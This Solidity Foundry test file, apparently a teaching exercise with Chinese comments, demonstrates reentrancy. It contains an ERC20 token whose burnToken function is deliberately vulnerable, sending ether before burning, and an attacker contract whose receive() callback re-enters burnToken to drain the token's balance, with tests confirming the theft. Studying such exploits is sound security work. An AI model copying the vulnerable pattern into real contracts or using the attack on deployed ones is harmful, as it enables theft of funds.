// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "forge-std/Test.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
/// @custom:security-contact euraxluo@outlook.com

//继承基本ERC20
contract EToken is ERC20, Ownable {
    // token 所有者的地址，这个地址会变，所以需要在构造函数中获取
    address public tokenOwner;
    uint256 public price = 10 ** 15;

    error purchaseERROR();
    constructor() payable ERC20("EToken", "ETK") {
        tokenOwner = msg.sender;
        // token : 1 finney  = 1000 token
        _mint(msg.sender, msg.value / price);
    }

    // msg.value 是receive的wei
    // msg.sender 是 给我钱的人的地址
    //  接受eth来生成token
    function purchase() external payable {
        uint256 _amount = msg.value / price;
        // sol中有两种错误检测(require 和 assert)，require发生错误时不会产生gas
        require(balanceOf(tokenOwner) >= _amount, "Not enough tokens");
        // _transfer传输转移token给购买者
        _transfer(tokenOwner, msg.sender, _amount);
        // 发出Transfer事件
        emit Transfer(tokenOwner, msg.sender, _amount);
    }

    // 铸造代币,只允许 token ower 能够铸造代币
    function mint(uint _amount) public onlyOwner {
        _mint(tokenOwner, _amount);
    }

    // 具有重入漏洞的函数
    function burnToken(uint256 _amount) external {
        require(balanceOf(msg.sender) >= _amount, "Not enough tokens");
        uint256 value = ((_amount * price) / 100) * 100;
        // 计算需要退退换的token，只退款原价的 90
        (bool success,) = msg.sender.call{value : value}("");
        require(success, "burnToken");
        if (success) {
            _burn(msg.sender, _amount);
            emit Transfer(msg.sender, address(0), _amount);
        }
    }
}

// 攻击合约
contract AttackEtoken {
    uint256 _amount;
    EToken public token;
    // 接受一点钱进行攻击
    constructor(address tokenAddress) payable{
        token = EToken(address(tokenAddress));
    }
    // receive attack
    receive() payable external {
        if (address(token).balance >= 1 ether) {
            token.burnToken(_amount);
            console2.log(address(token).balance);
            console2.log(address(this).balance);
        }
    }
    // 购买token
    function buyToken(uint256 amount) public payable {
        require(address(this).balance >= amount * token.price(), "need some ether to buy token");
        // 购买 token
        token.purchase{value : amount * token.price()}();
    }
    // 赎回ethers
    function burnTotalToken() public {
        _amount = token.balanceOf(address(this));
        // 查看获得的token数量，并且用全部的 token 赎回eth
        token.burnToken(_amount);
    }
    // 攻击函数
    function attack() external {
        require(address(this).balance >= 1 ether, "need some ether to attack");
        // 购买 token,然后赎回
        this.buyToken(1 ether / token.price());
        this.burnTotalToken();
    }
}

contract AttackETokenTest is DSTest {
    EToken public token;
    AttackEtoken public attack;

    function setUp() public {
        // 初始化两个合约
        token = new EToken{value : 10 ether}();
        // 存入 10 ether ，得到 10000 token
        attack = new AttackEtoken{value : 1 ether}(address(token));
        // 为攻击者存入 1 ether
    }

    // 测试  购买token
    function testBuyToken() public {
        // 购买 1000 个 token，将花费 1 ether
        attack.buyToken(1 ether / token.price());
        // token 将会有 11 ether
        assertEq(address(token).balance, 11 ether);
        assertEq(address(attack).balance, 0 ether);

        console2.log(token.totalSupply());
        console2.log(token.balanceOf(address(this)));
        console2.log(token.balanceOf(address(attack)));
    }

    // 测试  赎回Ethers
    function BurnToken() public {
        // 购买 1000 个 token，将花费 1 ether
        attack.buyToken(1 ether / token.price());
        // token 将会有 11 ether
        assertEq(address(token).balance, 11 ether);
        assertEq(address(attack).balance, 0 ether);
        // 销毁token
        attack.burnTotalToken();
        console2.log("finally balance ");

        assertEq(token.totalSupply(), 9000);
        assertEq(address(attack).balance, 0 ether);
    }

    // 进行攻击
    function testAttack() public {
        console.log(block.timestamp);
        attack.attack();
        assertEq(address(attack).balance, 11 ether);
        assertEq(address(token).balance, 0 ether);
        console2.log(address(attack).balance);
    }
}
